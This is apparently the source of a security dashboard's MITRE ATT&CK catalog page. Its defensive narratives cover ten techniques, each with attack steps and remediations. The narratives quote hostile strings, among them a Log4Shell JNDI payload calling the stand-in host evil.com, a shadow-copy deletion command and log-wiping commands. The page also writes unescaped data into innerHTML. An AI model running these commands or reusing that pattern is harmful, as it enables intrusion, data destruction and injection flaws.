/**
 * frontend/assets/js/mitre-catalog.js
 * MITRE ATT&CK Catalog Taxonomy & Step-by-Step Attack Walkthrough Inspector
 */

let tacticsList = [];
let techniquesList = [];
let activeTacticFilter = 'ALL';

const CATALOG_NARRATIVES = {
  'T1190': {
    title: 'Exploit Public-Facing Application',
    step1: 'Attacker scans your public IP/web server (Port 80/443), identifies unpatched parameters, and sends crafted input (SQLi / JNDI / SSRF payloads).',
    step2: 'The backend web framework fails input sanitization, executing the command in the application process context without authentication.',
    step3: 'Attacker extracts database credentials, establishes a reverse web shell, and compromises web tier host files.',
    scenario: 'Log4Shell (CVE-2021-44228) & Equifax Struts RCE: Attackers inject strings like ${jndi:ldap://evil.com/a} into HTTP headers to trigger remote code execution on web servers.',
    solution: 'Place WAF in active blocking mode, deploy input parameter sanitization with prepared statements, and quarantine public-facing web PID.'
  },
  'T1078': {
    title: 'Valid Accounts Abuse',
    step1: 'Attacker obtains valid username and password hashes via credential dumps, phishing, or default vendor configurations.',
    step2: 'The adversary authenticates through standard SSH, RDP, or cloud console portals outside business hours, bypassing traditional firewalls.',
    step3: 'Using the legitimate privileges of the account, the attacker accesses confidential database schemas and creates secondary backdoor accounts.',
    scenario: 'Colonial Pipeline VPN Breach (DarkSide): Compromised single-factor legacy VPN password used to log in legitimately, leading to enterprise-wide infrastructure shutdown.',
    solution: 'Immediately terminate all active sessions for the user, force password rotation, revoke cloud API access tokens, and mandate hardware MFA.'
  },
  'T1566': {
    title: 'Phishing Weapon Delivery',
    step1: 'Victim receives an urgent email masquerading as an executive invoice or corporate HR notice containing a malicious ZIP or macro attachment.',
    step2: 'Victim double-clicks and opens the attachment; a background VBScript/macro triggers an automated hidden PowerShell execution.',
    step3: 'The script downloads a Cobalt Strike stager or keylogger, stealing cached browser cookies and network passwords.',
    scenario: 'Emotet / TrickBot Infection Wave: Password-protected ZIP files with weaponized macro spreadsheets bypassing perimeter email scanners and dropping secondary ransomware payloads.',
    solution: 'Isolate affected workstation from corporate LAN, purge email message ID across all Exchange mailboxes, and block sender domain.'
  },
  'T1133': {
    title: 'External Remote Services Exposure',
    step1: 'Attacker identifies exposed remote management interfaces (RDP port 3389, SSH port 22, or corporate VPN gateways) exposed directly to the internet.',
    step2: 'The adversary executes high-speed credential stuffing or exploits unpatched SSL VPN vulnerabilities (e.g. Fortinet/Pulse Secure CVEs).',
    step3: 'Once authenticated, the attacker tunnels into the internal network DMZ, moving laterally toward corporate active directory servers.',
    scenario: 'Pulse Secure / Citrix Gateway VPN Exploits: Zero-day path traversal vulnerabilities exploited to read VPN session databases and hijack active remote administrator connections.',
    solution: 'Block offending source IP at edge perimeter firewall, disable direct RDP exposure to internet, enforce VPN MFA, and enable Geo-IP filtering.'
  },
  'T1059': {
    title: 'Command and Scripting Interpreter Execution',
    step1: 'Attacker drops an obfuscated script (PowerShell, Bash, or Python) on the system via initial access foothold or secondary stager.',
    step2: 'Attacker executes PowerShell with -ExecutionPolicy Bypass -NoProfile -EncodedCommand, running code directly in RAM memory without writing to disk.',
    step3: 'The in-memory script injects shellcode into svchost.exe or explorer.exe, bypassing antivirus scanning and granting full remote command control.',
    scenario: 'SolarWinds SUNBURST & Cobalt Strike Beaconing: Trojanized software updates launching encoded background PowerShell processes that query system architecture and communicate with external C2.',
    solution: 'Enforce PowerShell ConstrainedLanguageMode, enable script block logging (Event ID 4104), and terminate originating PID.'
  },
  'T1110': {
    title: 'Brute Force & Credential Spraying',
    step1: 'Attacker uses automated tools (Hydra, Medusa, or custom Python scripts) to cycle through thousands of common passwords against SSH/HTTP login routes.',
    step2: 'The server receives dozens of authentication requests per second, flooding auth.log with "Failed password for invalid user" entries.',
    step3: 'The attacker finds a single weak password (e.g. "Summer2026!"), logs in with user privileges, and proceeds to local system privilege escalation.',
    scenario: 'Mass SSH Scanner Botnets (Mirai & FritzFrog): Distributed botnets sending millions of SSH password combinations against Linux cloud servers with weak root credentials.',
    solution: 'Enforce account lockouts after 5 consecutive failures, ban offending IP subnet dynamically via fail2ban, and disable password-based SSH authentication.'
  },
  'T1486': {
    title: 'Data Encrypted for Impact (Ransomware)',
    step1: 'Attacker deploys ransomware executable onto domain controller or shared storage after establishing admin privileges across the subnet.',
    step2: 'The ransomware process terminates database engines and deletes Volume Shadow Copies (vssadmin delete shadows /all /quiet) to prevent recovery.',
    step3: 'It systematically encrypts every document, database, and system file with AES-256 / RSA-4096, changing file extensions and displaying ransom demands.',
    scenario: 'LockBit 3.0 & WannaCry Ransomware Outbreaks: Automated multithreaded file encryption terminating hypervisor VMs, encrypting virtual disks (.vmdk), and demanding cryptocurrency ransoms.',
    solution: 'IMMEDIATELY disconnect network cables and disable all network adapters (do NOT reboot). Capture RAM dump and restore systems from offline immutable backups.'
  },
  'T1048': {
    title: 'Exfiltration Over Alternative Protocol',
    step1: 'Attacker compresses sensitive files (customer databases, credentials, source code) into password-protected archives (e.g., 7z or tar.gz).',
    step2: 'The attacker initiates outbound data transfers using non-standard protocols (DNS tunneling, ICMP payloads, or encrypted HTTPS POST to external IPs).',
    step3: 'Confidential proprietary data leaves the network perimeter undetected by standard email and web filters, leading to data extortion.',
    scenario: 'Lapsus$ & Conti Corporate Data Extortion: Exfiltrating source code and cryptographic certificates to cloud file sharing services (Mega, Dropbox) prior to deploying encryption.',
    solution: 'Blackhole outbound destination IP address on edge routers, reset perimeter egress NAT, and inspect egress proxy logs for anomalous data spikes.'
  },
  'T1070': {
    title: 'Indicator Removal on Host (Log Tampering)',
    step1: 'Attacker gains local administrative or root permissions on the compromised server.',
    step2: 'The attacker runs commands like "wevtutil cl Security" or "rm -rf /var/log/*" to wipe audit trails and security event logs.',
    step3: 'Forensic investigators lose visibility into what files were accessed, what malware was downloaded, and how the breach originated.',
    scenario: 'APT29 / Nobelium Forensic Countermeasures: Clearing Windows Event Log IDs 1102 (audit log cleared) and altering file timestamps ($MFT timestomping) to hide malicious activity.',
    solution: 'Forward syslog/Windows Event Logs in real-time to an immutable, write-only SIEM, lock local log permissions, and alert on Event ID 1102.'
  },
  'T1068': {
    title: 'Exploitation for Privilege Escalation',
    step1: 'Attacker accesses the system as an unprivileged local user (e.g. www-data or guest).',
    step2: 'The attacker executes a local privilege escalation exploit targeting known kernel bugs (e.g. Dirty COW, PwnKit) or misconfigured SUID binaries.',
    step3: 'The kernel grants root/SYSTEM UID 0 privileges, allowing the attacker to bypass all user permissions and install kernel rootkits.',
    scenario: 'PwnKit (CVE-2021-4034) & Dirty Pipe (CVE-2022-0847): Unprivileged local users exploiting polkit pkexec binary to instantly gain interactive root shells on default Linux distributions.',
    solution: 'Deploy operating system and kernel security patches immediately, strip SUID bits from unnecessary binaries, and enforce SELinux in Enforcing mode.'
  }
};

async function initCatalog() {
  requireAuth();
  injectNavbar();
  setBreadcrumb([{ href: 'dashboard.html', label: 'Dashboard' }, { href: 'mitre-catalog.html', label: 'ATT&CK Catalog' }]);

  const [tRes, cRes] = await Promise.all([
    Api.mitreTactics(),
    Api.mitreCatalog({ limit: 50 })
  ]);

  if (tRes.ok && tRes.data?.tactics) {
    tacticsList = tRes.data.tactics;
    renderTacticChips();
  }

  if (cRes.ok && cRes.data?.techniques) {
    techniquesList = cRes.data.techniques;
    renderCatalog();
  }
}

function renderTacticChips() {
  const nav = document.getElementById('tacticNav');
  if (!nav) return;
  nav.innerHTML = `
    <button class="tactic-chip ${activeTacticFilter === 'ALL' ? 'active' : ''}" onclick="selectTactic('ALL')">All Categories (${techniquesList.length})</button>
    ${tacticsList.map(t => `
      <button class="tactic-chip ${activeTacticFilter === t.id ? 'active' : ''}" onclick="selectTactic('${t.id}')">
        ${t.name}
      </button>
    `).join('')}
  `;
}

function selectTactic(tid) {
  activeTacticFilter = tid;
  renderTacticChips();
  renderCatalog();
}

function filterCatalog() {
  renderCatalog();
}

function renderCatalog() {
  const q = document.getElementById('searchQuery')?.value.trim().toLowerCase() || '';
  const sev = document.getElementById('filterSev')?.value || '';
  const container = document.getElementById('catalogContainer');
  if (!container) return;

  // Filter techniques
  let filtered = techniquesList.filter(t => {
    if (activeTacticFilter !== 'ALL' && t.tactic !== activeTacticFilter) return false;
    if (sev && t.severity !== sev) return false;
    if (q) {
      const matchName = t.name.toLowerCase().includes(q);
      const matchId = t.id.toLowerCase().includes(q);
      const matchDesc = (t.description || '').toLowerCase().includes(q);
      const matchPats = (t.log_patterns || []).some(p => p.toLowerCase().includes(q));
      if (!matchName && !matchId && !matchDesc && !matchPats) return false;
    }
    return true;
  });

  if (!filtered.length) {
    container.innerHTML = `
      <div class="card" style="padding:48px;text-align:center;color:var(--ink-2);">
        <p style="font-weight:700;margin-bottom:6px;font-size:1.1rem;color:var(--ink-0);">No matching ATT&CK techniques found</p>
        <p style="font-size:var(--text-xs);color:var(--ink-3);">Try adjusting your search query or severity filter.</p>
      </div>
    `;
    return;
  }

  // Group by tactics
  const grouped = {};
  filtered.forEach(t => {
    if (!grouped[t.tactic]) grouped[t.tactic] = [];
    grouped[t.tactic].push(t);
  });

  // Render categories in tactical order
  let html = '';
  tacticsList.forEach(tactic => {
    const list = grouped[tactic.id];
    if (!list || !list.length) return;

    html += `
      <div class="tactic-section">
        <div class="tactic-header">
          <div class="tactic-title">
            <span>${tactic.name}</span>
            <span class="tactic-badge">${list.length} techniques</span>
          </div>
          <span style="font-size:12px;color:var(--ink-3);">${tactic.description || ''}</span>
        </div>

        <div class="tech-grid">
          ${list.map(tech => `
            <div class="tech-card" onclick="openTechModal('${tech.id}')">
              <div>
                <div class="tech-top">
                  <span class="tech-id">${tech.id}</span>
                  ${sevBadge(tech.severity)}
                </div>
                <div class="tech-name">${tech.name}</div>
                <div class="tech-desc">${tech.description || 'No description available.'}</div>
              </div>
              <div class="tech-foot">
                <span>${(tech.examples || []).length} scenarios</span>
                <span style="font-weight:600;color:var(--brand-primary);display:flex;align-items:center;gap:4px;">
                  Explore <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="9 18 15 12 9 6"/></svg>
                </span>
              </div>
            </div>
          `).join('')}
        </div>
      </div>
    `;
  });

  container.innerHTML = html;
}

function openTechModal(tid) {
  const tech = techniquesList.find(t => t.id === tid);
  if (!tech) return;

  const tactic = tacticsList.find(t => t.id === tech.tactic);
  const narr = CATALOG_NARRATIVES[tid] || {
    title: tech.name,
    step1: `Adversary probes system looking for opportunities related to ${tech.name}.`,
    step2: `Adversary executes unauthorized actions targeting this vector.`,
    step3: `System assets or credentials are compromised.`,
    scenario: tech.examples?.[0] || 'Real-world adversary operational campaign.',
    solution: tech.remediation || 'Isolate host, collect forensic volatile memory, and rotate credentials.'
  };

  document.getElementById('modalId').textContent = tech.id;
  document.getElementById('modalName').textContent = narr.title;
  
  const descEl = document.getElementById('modalDesc');
  descEl.innerHTML = `
    <p style="margin-bottom:8px;">${tech.description}</p>
    <div class="attack-steps-flow">
      <div class="attack-step-item">
        <span class="attack-step-num">Step 1: Infiltration</span>
        <span>${narr.step1}</span>
      </div>
      <div class="attack-step-item">
        <span class="attack-step-num">Step 2: Execution</span>
        <span>${narr.step2}</span>
      </div>
      <div class="attack-step-item">
        <span class="attack-step-num">Step 3: Compromise</span>
        <span>${narr.step3}</span>
      </div>
    </div>
    <div class="sol-box">
      <strong>Possible Solution & Actionable Remediation:</strong><br/>
      ${narr.solution}
    </div>
  `;

  const sevEl = document.getElementById('modalSev');
  const cls = { LOW: 'badge-success', MEDIUM: 'badge-warn', HIGH: 'badge-danger', CRITICAL: 'badge-critical' }[tech.severity] || 'badge-neutral';
  sevEl.className = 'badge ' + cls;
  sevEl.textContent = tech.severity;

  document.getElementById('modalTactic').textContent = tactic ? tactic.name : tech.tactic;

  // Render Scenarios
  const exDiv = document.getElementById('modalExamples');
  if (narr.scenario) {
    exDiv.innerHTML = `
      <div class="example-box">
        <strong>Commonly Used Real-World Scenario:</strong><br/>
        ${narr.scenario}
      </div>
      ${(tech.examples && tech.examples.length) ? tech.examples.map(ex => `<div class="example-box">${ex}</div>`).join('') : ''}
    `;
  } else {
    exDiv.innerHTML = (tech.examples && tech.examples.length)
      ? tech.examples.map(ex => `<div class="example-box">${ex}</div>`).join('')
      : '<div style="font-size:12px;color:var(--ink-3);">No specific scenario examples documented.</div>';
  }

  // Render Log Signatures
  const patDiv = document.getElementById('modalPatterns');
  const pats = tech.log_patterns || [];
  if (pats.length) {
    patDiv.innerHTML = pats.map(p => `<span class="pattern-badge">${p}</span>`).join('');
  } else {
    patDiv.innerHTML = '<div style="font-size:12px;color:var(--ink-3);">No specific regex patterns mapped.</div>';
  }

  // External Link
  const link = document.getElementById('modalLink');
  link.href = tech.mitre_url || `https://attack.mitre.org/techniques/${tech.id}/`;

  document.getElementById('techModal').classList.add('show');
}

function closeModal() {
  document.getElementById('techModal')?.classList.remove('show');
}
